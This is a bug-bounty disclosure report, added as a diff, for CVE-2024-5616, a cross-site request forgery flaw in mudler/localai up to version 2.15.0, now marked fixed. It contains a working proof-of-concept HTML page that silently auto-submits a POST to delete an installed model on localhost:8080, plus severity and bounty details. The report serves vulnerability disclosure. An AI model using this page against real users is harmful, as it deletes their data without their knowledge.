@@ -1,0 +1,40 @@
+Title: CSRF lead to delete installed models in mudler/localai
+
+Proof of Concept: 
+This poc.html demo delete the installed model gpt-4-vision-preview
+
+<html>
+  <body>
+    <form action="http://localhost:8080/browse/delete/model/gpt-4-vision-preview" method="POST">
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+Open the poc.html in browser. Reload the page, you can see the model gpt-4-vision-preview is deleted.
+
+Impact: 
+trick victims into deleting installed models.
+
+CVE ID: CVE-2024-5616
+Status: (published)
+Vulnerability Type: CWE-352: Cross-Site Request Forgery (CSRF)
+Severity: Medium (4.3)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: Required
+Scope: Unchanged
+Confidentiality: None
+Integrity: None
+Availability: Low
+Registry: Packagist
+Affected Version: <=2.15.0
+Visibility: Public
+Status: Fixed
+Disclosure Bounty: $75
+Fix Bounty: $18.75
